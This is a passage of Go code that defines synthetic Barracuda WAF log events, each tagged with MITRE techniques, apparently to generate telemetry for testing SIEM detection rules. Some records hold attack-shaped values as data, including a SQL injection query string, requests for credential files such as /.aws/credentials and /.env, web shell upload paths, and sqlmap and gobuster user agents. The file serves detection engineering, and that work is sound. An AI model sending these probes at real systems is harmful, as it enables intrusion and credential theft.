			Desc:    "A request was matched by the geographic ACL. Attack ID 342. Useful as corroboration: an admin path reached from a country the business does not operate in.",
			EventID: "GEO_IP_BLOCKED", Channel: "WF", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1190"},
			Params: []core.Param{bwpSrcIP, bwpURL},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwWFBase(c)
			r.attack = "GEO_IP_BLOCKED"
			r.rule = "global"
			r.ruleType = "GLOBAL URL ACL"
			r.action = "DENY"
			r.followUp = "NONE"
			r.hostURL = bwSite(c) + c.P("url", "/admin")
			r.details = "[GeoIP policy matched country " + c.Pick("RU", "CN", "KP", "IR", "BY") + "]"
			return bwPayload(c, core.SevAlert, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-wf-session-not-found", Source: core.SourceBarracudaWAF,
			Group: "Web Firewall: Policy", Name: "Session not found",
			Desc:    "A request reached a URL that requires an established session without one. Attack ID 161, category Forceful Browsing. Forced browsing to a deep endpoint looks exactly like this.",
			EventID: "SESSION_NOT_FOUND", Channel: "WF", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1083", "T1190"},
			Params: []core.Param{bwpSrcIP, bwpURL},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwWFBase(c)
			r.attack = "SESSION_NOT_FOUND"
			r.rule = "webapp/account"
			r.ruleType = "URL POLICY"
			r.action = "DENY"
			r.followUp = "NONE"
			r.hostURL = bwSite(c) + c.P("url", "/account/settings")
			r.details = "[No session context for requested URL]"
			return bwPayload(c, core.SevAlert, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-wf-cookie-replay-ip", Source: core.SourceBarracudaWAF,
			Group: "Web Firewall: Policy", Name: "Mismatched IP cookie replay",
			Desc:    "A session cookie arrived from a different source address than the one it was issued to. Attack ID 117. That is session hijacking or a stolen token in use.",
			EventID: "COOKIE_REPLAY_MISMATCHED_IP", Channel: "WF", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1539", "T1550.004"},
			Params: []core.Param{bwpSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwWFBase(c)
			r.attack = "COOKIE_REPLAY_MISMATCHED_IP"
			r.severity = bwSevWarn
			r.rule = "global"
			r.ruleType = "GLOBAL"
			r.action = "DENY"
			r.followUp = "NONE"
			r.hostURL = bwSite(c) + "/account/orders"
			r.authUser = c.User()
			// The address embedded in the cookie is not the address the request
			// came from; drawn once so the record stays internally consistent.
			r.details = "[Cookie IP " + c.InternalIP() + " does not match request source " + r.clientIP + "]"
			return bwPayload(c, core.SevWarning, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-wf-slash-dot-logged", Source: core.SourceBarracudaWAF,
			Group: "Web Firewall: Policy", Name: "Slash-dot in URL path (detected, not blocked)",
			Desc:    "A request path contained a slash followed by a dot, which is the shape of a hidden-file disclosure probe. Attack ID 14. Logged only, so the file was served if it existed.",
			EventID: "SLASH_DOT_IN_URL", Channel: "WF", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1083", "T1552.001"},
			Params: []core.Param{bwpSrcIP, bwpURL},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwWFBase(c)
			r.attack = "SLASH_DOT_IN_URL"
			r.rule = "global"
			r.ruleType = "GLOBAL"
			r.action = "LOG"
			r.followUp = "NONE"
			r.hostURL = bwSite(c) + c.P("url", c.Pick("/.git/config", "/.env", "/.aws/credentials", "/.svn/entries"))
			r.details = "[Slash-dot sequence in requested URL]"
			return bwPayload(c, core.SevAlert, r.render(c))
		},
	})

}

// ---------------------------------------------------------------------------
// Access log  (%lt = TR)
// ---------------------------------------------------------------------------

func registerBarracudaWAFAccess() {
	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-tr-login-failed", Source: core.SourceBarracudaWAF,
			Group: "Access Log", Name: "Failed application login",
			Desc:    "A POST to the login endpoint answered 401. Repeat it from one client to build the credential-stuffing pattern the Web Firewall brute force rule eventually trips on.",
			EventID: "401", Channel: "TR", Severity: core.SevLabelMedium,
			Mitre: []string{"T1110.003"}, Wazuh: []string{"31101"},
			Params: []core.Param{bwpSrcIP, param("user", "Attempted account", "auto"), bwpUA},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwTRBase(c)
			r.method = "POST"
			r.url = "/login"
			r.status = 401
			r.bytesSent = c.Int(300, 900)
			r.bytesRecv = c.Int(120, 400)
			r.query = "-"
			// The attempted account appears in the login field and nowhere
			// else; %au stays empty because authentication did not succeed.
			r.login = c.P("user", c.User())
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-tr-login-success", Source: core.SourceBarracudaWAF,
			Group: "Access Log", Name: "Successful application login",
			Desc:    "A 200 on the login endpoint with the account populated in both the login and authenticated-user fields. The record that matters is this one arriving after a run of 401s from the same client.",
			EventID: "200", Channel: "TR", Severity: core.SevLabelInfo,
			Mitre:  []string{"T1078"},
			Params: []core.Param{bwpSrcIP, param("user", "Account", "auto"), bwpUA},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwTRBase(c)
			// One account, used for %id and %au both. Drawing twice is how this
			// record would end up claiming one user logged in as another.
			user := c.P("user", c.User())
			r.method = "POST"
			r.url = "/login"
			r.status = 200
			r.query = "-"
			r.login = user
			r.authUser = user
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-tr-admin-path", Source: core.SourceBarracudaWAF,
			Group: "Access Log", Name: "Administrative path reached",
			Desc:    "An application administration URL was served successfully to an external client. Worth a rule on its own: these paths should not be reachable from the internet.",
			EventID: "200", Channel: "TR", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1078", "T1190"},
			Params: []core.Param{bwpSrcIP, bwpURL, bwpUA},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwTRBase(c)
			user := c.AdminUser()
			r.url = c.P("url", c.Pick("/admin/", "/wp-admin/", "/manager/html", "/phpmyadmin/", "/console/"))
			r.query = "-"
			r.login = user
			r.authUser = user
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-tr-webshell-upload", Source: core.SourceBarracudaWAF,
			Group: "Access Log", Name: "Script uploaded and then requested",
			Desc:    "A POST that put a server-side script into a writable directory and came back 200. Pair it with the request for the same path to show a web shell being planted and used.",
			EventID: "200", Channel: "TR", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1505.003", "T1105"},
			Params: []core.Param{bwpSrcIP, bwpURL, bwpUA},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwTRBase(c)
			r.method = "POST"
			r.url = c.P("url", "/uploads/"+c.Pick("cmd.php", "shell.aspx", "up.jsp", "x.phtml"))
			r.query = "-"
			r.bytesRecv = c.Int(1500, 90000)
			r.bytesSent = c.Int(100, 600)
			// A planted shell is usually dropped through a path the profile has
			// never seen, so the profile stays DEFAULT rather than PROFILED.
			r.profile = "DEFAULT"
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-tr-scanner-404", Source: core.SourceBarracudaWAF,
			Group: "Access Log", Name: "Content discovery sweep (404)",
			Desc:    "A 404 for a path from a scanner wordlist. Burst this from one client to make the directory-brute-force shape a rule can count on.",
			EventID: "404", Channel: "TR", Severity: core.SevLabelMedium,
			Mitre: []string{"T1595.003"}, Wazuh: []string{"31101"},
			Params: []core.Param{bwpSrcIP, bwpURL, bwpUA},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwTRBase(c)
			r.url = c.P("url", c.Pick(
				"/backup.zip", "/config.bak", "/db_dump.sql", "/.well-known/security.txt",
				"/server-status", "/actuator/env", "/api/v1/swagger.json"))
			r.status = 404
			r.query = "-"
			r.bytesSent = c.Int(120, 500)
			// A 404 is generated by the appliance or the backend's error page,
			// so time taken is small.
			r.serverMs = c.Int(1, 8)
			r.timeTaken = r.serverMs + c.Int(1, 5)
			r.userAgent = c.P("useragent", c.Pick(
				"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
				"gobuster/3.6", "sqlmap/1.8#stable (https://sqlmap.org)", "curl/8.4.0"))
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-tr-blocked-internal-response", Source: core.SourceBarracudaWAF,
			Group: "Access Log", Name: "Request answered by the WAF itself",
			Desc:    "A 403 served with response type INTERNAL, meaning the appliance answered rather than the backend. This is the access-log side of a Web Firewall block and lets a rule correlate the two by session ID.",
			EventID: "403", Channel: "TR", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1190"},
			Params: []core.Param{bwpSrcIP, bwpURL, bwpUA},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwTRBase(c)
			r.url = c.P("url", "/search")
			r.query = "q=1'+OR+1=1--"
			r.status = 403
			r.respType = "INTERNAL"
			r.wfMatched = "INVALID"
			r.bytesSent = c.Int(200, 900)
			// The backend never saw the request, so there is no server-side
			// time and no backend address to report.
			r.serverIP = "-"
			r.serverPt = 0
			r.serverMs = 0
			r.timeTaken = c.Int(1, 9)
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-tr-unprotected-service", Source: core.SourceBarracudaWAF,
			Group: "Access Log", Name: "Request served with protection disabled",
			Desc:    "Protected reads UNPROTECTED, so the request bypassed the rule and policy checks entirely. A coverage gap on a live service, and it will never show up in the Web Firewall log because nothing was evaluated.",
			EventID: "200", Channel: "TR", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{bwpSrcIP, bwpURL, bwpUA},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwTRBase(c)
			r.url = c.P("url", "/api/v2/internal/export")
			r.query = "-"
			r.protected = "UNPROTECTED"
			r.profile = "DEFAULT"
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-tr-bulk-download", Source: core.SourceBarracudaWAF,
			Group: "Access Log", Name: "Large authenticated download",
			Desc:    "A single response measured in tens of megabytes from an export endpoint. Alone it is a report; from an unusual client or outside hours it is exfiltration.",
			EventID: "200", Channel: "TR", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1530", "T1567.002"},
			Params: []core.Param{bwpSrcIP, param("user", "Account", "auto"), bwpURL},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwTRBase(c)
			user := c.P("user", c.User())
			r.url = c.P("url", c.Pick("/reports/export.csv", "/api/v1/customers/all", "/backup/db.sql"))
			r.query = "format=csv&limit=0"
			r.bytesSent = c.Int(25_000_000, 400_000_000)
			r.bytesRecv = c.Int(200, 600)
			r.serverMs = c.Int(4000, 55000)
			r.timeTaken = r.serverMs + c.Int(100, 2000)
			r.login = user
			r.authUser = user
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

}

// ---------------------------------------------------------------------------
// Audit log  (%lt = AUDIT)
// ---------------------------------------------------------------------------

func registerBarracudaWAFAudit() {
	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-login-failed", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Failed administrator login",
			Desc:    "A rejected login to the appliance. Repeat it to produce brute force against the WAF management interface, which is a target in its own right.",
			EventID: "UNSUCCESSFUL LOGIN", Channel: "AUDIT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1110.001"},
			Params: []core.Param{bwpUser, bwpSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			r.txType = "UNSUCCESSFUL LOGIN"
			r.txID = -1
			r.command = "-"
			r.change = "NONE"
			r.loginIP = c.P("srcip", c.ExternalIP())
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-access-violation", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Admin access violation",
			Desc:    "Management access attempted from an address outside the allowed administration network. Somebody is reaching for the appliance from where they should not be.",
			EventID: "ADMIN ACCESS VIOLATION", Channel: "AUDIT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1078", "T1133"},
			Params: []core.Param{bwpUser, bwpSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			r.txType = "ADMIN ACCESS VIOLATION"
			r.txID = -1
			r.command = "-"
			r.change = "NONE"
			r.loginIP = c.P("srcip", c.ExternalIP())
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-admin-added", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Administrator account created",
			Desc:    "A new appliance administrator was added. Persistence on the security control itself, which survives a password reset on everything behind it.",
			EventID: "CONFIG", Channel: "AUDIT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1136.001", "T1098"},
			Params: []core.Param{bwpUser, bwpSrcIP, param("account", "New account", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			account := c.P("account", c.Pick("svc_backup", "helpdesk2", "monitor", "waf_support"))
			r.change = "ADD"
			r.objType = "admin_access_control_user"
			r.objName = account
			r.variable = "admin_access_control_user_role"
			r.oldValue = ""
			r.newValue = "admin"
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-policy-weakened", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Security policy action weakened",
			Desc:    "An attack action was moved from protect to allow-and-log, which turns a block into a note in a file. Defence evasion carried out through the console rather than on the host.",
			EventID: "CONFIG", Channel: "AUDIT", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{bwpUser, bwpSrcIP, param("attack", "Attack ID", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			r.objType = "security_policy_attack_action"
			r.objName = c.P("attack", c.Pick(
				"sql-injection-in-parameter", "cross-site-scripting-pattern-in-parameter",
				"os-command-injection-pattern-in-parameter", "directory-traversal-pattern-in-parameter"))
			r.variable = "action"
			r.oldValue = "protect_and_log"
			r.newValue = "allow_and_log"
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-service-mode-passive", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Service switched to passive mode",
			Desc:    "A protected service was moved from active to passive, so the WAF watches and no longer blocks for that site. Every subsequent access-log record for it reads PASSIVE.",
			EventID: "CONFIG", Channel: "AUDIT", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{bwpUser, bwpSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			r.objType = "virtual_service"
			r.objName = c.Env.WebHost + "_https"
			r.variable = "service_mode"
			r.oldValue = "Active"
			r.newValue = "Passive"
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-acl-deleted", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Allow/Deny rule deleted",
			Desc:    "A URL ACL was removed. If an attack is blocked by a named rule one hour and allowed the next, this is the record that explains it.",
			EventID: "CONFIG", Channel: "AUDIT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1562.004"},
			Params: []core.Param{bwpUser, bwpSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			rule := c.Pick("deny_admin_paths", "deny_wp_admin", "block_geo_high_risk", "deny_backup_files")
			r.change = "DELETE"
			r.objType = "url_acl"
			r.objName = rule
			r.variable = "url_acl_deny"
			r.oldValue = rule
			r.newValue = ""
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-logging-disabled", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Syslog export disabled",
			Desc:    "The export log server was switched off. The last record before a source goes quiet, and the one a SIEM should alert on immediately.",
			EventID: "CONFIG", Channel: "AUDIT", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1562.008", "T1070"},
			Params: []core.Param{bwpUser, bwpSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			r.objType = "export_logs_syslog_server"
			r.objName = c.InternalIP()
			r.variable = "syslog_server_status"
			r.oldValue = "On"
			r.newValue = "Off"
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-certificate-uploaded", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Certificate uploaded",
			Desc:    "A signed certificate and private key were installed on the appliance. An unexpected certificate on a public service is a man-in-the-middle position being set up.",
			EventID: "CONFIG", Channel: "AUDIT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1608.003", "T1553.004"},
			Params: []core.Param{bwpUser, bwpSrcIP, param("cert", "Certificate name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			r.change = "ADD"
			r.objType = "signed_certificate"
			r.objName = c.P("cert", "star_"+strings.ReplaceAll(c.Env.Domain, ".", "_"))
			r.variable = "certificate_upload"
			r.oldValue = ""
			r.newValue = "uploaded"
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-certificate-bound", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Service certificate changed",
			Desc:    "The certificate bound to a published HTTPS service was swapped. Old and new names are both in the record, which is what makes it reviewable.",
			EventID: "CONFIG", Channel: "AUDIT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1553.004"},
			Params: []core.Param{bwpUser, bwpSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			r.objType = "virtual_service_ssl"
			r.objName = c.Env.WebHost + "_https"
			r.variable = "ssl_certificate"
			r.oldValue = "star_" + strings.ReplaceAll(c.Env.Domain, ".", "_")
			r.newValue = c.Pick("temp_selfsigned", "legacy_wildcard", "partner_issued")
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-audit-support-tunnel", Source: core.SourceBarracudaWAF,
			Group: "Audit", Name: "Support tunnel opened",
			Desc:    "An outbound support tunnel was established from the appliance. Legitimate during a vendor case and a remote access channel the rest of the time.",
			EventID: "SUPPORT TUNNEL OPEN", Channel: "AUDIT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1219", "T1572"},
			Params: []core.Param{bwpUser, bwpSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			r := bwAuditBase(c)
			r.txType = "SUPPORT TUNNEL OPEN"
			r.txID = -1
			r.command = "-"
			r.change = "NONE"
			return bwPayload(c, core.SevInfo, r.render(c))
		},
	})

}

// ---------------------------------------------------------------------------
// System log  (%lt = SYS)
// ---------------------------------------------------------------------------

func registerBarracudaWAFSystem() {
	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-sys-account-locked", Source: core.SourceBarracudaWAF,
			Group: "System", Name: "Admin account locked out",
			Desc:    "Consecutive failed logins locked an appliance administrator. Module ADMIN_M, event ID 51001; this is the one system message the vendor publishes in full.",
			EventID: "51001", Channel: "SYS", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1110.001"},
			Params: []core.Param{bwpUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			user := c.P("user", c.AdminUser())
			return bwPayload(c, core.SevAlert, bwSysRecord(c, "ADMIN_M", bwSevAlert, 51001,
				"Account has been locked for user "+user+" because the number of consecutive "+
					"log-in failures exceeded the maximum allowed."))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-sys-certificate-expiring", Source: core.SourceBarracudaWAF,
			Group: "System", Name: "Certificate expiring",
			Desc:    "A certificate installed on a published service is close to expiry. An expired certificate on an edge service is an outage and a push to disable TLS checks.",
			EventID: "SYS", Channel: "SYS", Severity: core.SevLabelMedium,
			Params: []core.Param{param("cert", "Certificate name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			cert := c.P("cert", "star_"+strings.ReplaceAll(c.Env.Domain, ".", "_"))
			days := c.Pick1(2, 3, 7, 14, 30)
			return bwPayload(c, core.SevWarning, bwSysRecord(c, "CERT_M", bwSevWarn, 71001,
				fmt.Sprintf("Certificate %s will expire in %d days.", cert, days)))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-sys-service-down", Source: core.SourceBarracudaWAF,
			Group: "System", Name: "Backend server marked out of service",
			Desc:    "A health check failed and the WAF took a backend out of rotation. During an attack this is often the first sign the application fell over behind the firewall.",
			EventID: "SYS", Channel: "SYS", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1499"},
			Params: []core.Param{param("server", "Backend server", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			server := c.P("server", c.Env.WebHost)
			ip := c.InternalIP()
			return bwPayload(c, core.SevErr, bwSysRecord(c, "LB", "ERRO", 41002,
				"Server "+server+" ("+ip+":80) marked out of service: health check failed."))
		},
	})

}

// ---------------------------------------------------------------------------
// Network Firewall log  (%lt = NF)
// ---------------------------------------------------------------------------

func registerBarracudaWAFNetwork() {
	Register(core.Definition{
		Control: core.Control{
			ID: "barracuda-waf-nf-mgmt-denied", Source: core.SourceBarracudaWAF,
			Group: "Network Firewall", Name: "Management port access denied",
			Desc:    "A network ACL dropped a connection to the appliance management interface. Somebody scanning or reaching for the console from the wrong network.",
			EventID: "NF", Channel: "NF", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1046", "T1133"},
			Params: []core.Param{bwpSrcIP, param("dport", "Destination port", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			return bwPayload(c, core.SevWarning, bwNFRecord(c, bwSevWarn, "TCP",
				c.P("srcip", c.ExternalIP()), c.EphemeralPort(),
				bwServiceIP(c), c.PInt("dport", c.Pick1(8000, 22, 8443)),
				"DENY", "deny_mgmt_from_wan", "WAN interface traffic:deny"))
		},
	})

}
